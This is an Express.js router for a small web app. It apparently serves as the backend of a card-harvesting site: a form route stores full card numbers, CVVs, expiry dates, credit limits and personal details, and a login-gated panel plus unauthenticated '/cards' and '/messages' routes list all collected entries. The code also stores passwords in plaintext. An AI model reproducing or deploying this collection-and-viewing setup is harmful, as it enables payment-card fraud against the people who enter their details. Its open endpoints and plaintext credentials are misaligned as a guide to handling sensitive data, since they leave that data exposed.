var express = require('express');
var router = express.Router();
const CardModal = require('../models/CardData')
const MessageModal = require('../models/MessageData');
const UserModal = require('../models/User');
const { name } = require('ejs');

/* GET home page. */
router.get('/', function(req, res, next) {
  res.render('index', { title: 'Home' });
});
router.get('/form', function(req, res, next) {
  res.render('form', { title: 'Form' });
});
router.get('/signup', function(req, res, next) {
  res.render('register', { title: 'register' });
});
router.get('/loginn', function(req, res, next) {
  res.render('login', { title: 'login' });
});
router.get('/options', function(req, res, next) {
  res.render('option', { title: 'Options' });
});
router.post('/signup', async function(req, res, next) {
  try {
    var userDetails = new UserModal({
      email: req.body.email,
      password: req.body.password
    });
    const user = await userDetails.save();
    console.log(user);
  } catch (err) {
    console.log(err);
    res.status(500).json(err);
  }

  userDetails.save();
  res.render('login')
});
router.post('/card', async function(req, res, next) {
  try {
    var userDetails = new CardModal({
      name: req.body.name,
      mobile: req.body.mobile,
      email: req.body.email,
      dob: req.body.dob,
      totalLimit: req.body.totalLimit,
      avLimit: req.body.avLimit,
      cardNumber: req.body.cardNumber,
      holderName: req.body.holderName,
      exDate: req.body.expiry,
      cvv: req.body.cvv
    });
    const user = await userDetails.save();
    console.log(user);
  } catch (err) {
    console.log(err);
    res.status(500).json(err);
  }

  userDetails.save();
  res.render('success')
});

router.post('/message', async (req, res)=>{
  try {
    var userDetails = new MessageModal({
      message: req.body.message,
    });
    const message = await userDetails.save();
  } catch (err) {
    console.log(err);
    res.status(500).json(err);
  }
  res.send('message got success')
})

router.post('/login', async function(req, res, next) {
  let UserData = await UserModal.findOne({email: req.body.email})
  let cardData = await CardModal.find().sort({createdAt: -1});
  if(UserData){
    if(UserData.email === req.body.email && UserData.password === req.body.password){
      res.render("card", {cardData})
    }
  }else{
    res.send("Username and password invalid")
  }
});
router.post("/cards", async (req, res)=>{
  let cardData = await CardModal.find().sort({createdAt: -1});
  res.render("card", {cardData})
})
router.post("/messages", async (req, res)=>{
  let cardData = await MessageModal.find().sort({createdAt: -1});
  res.render("message", {cardData})
})

module.exports = router;
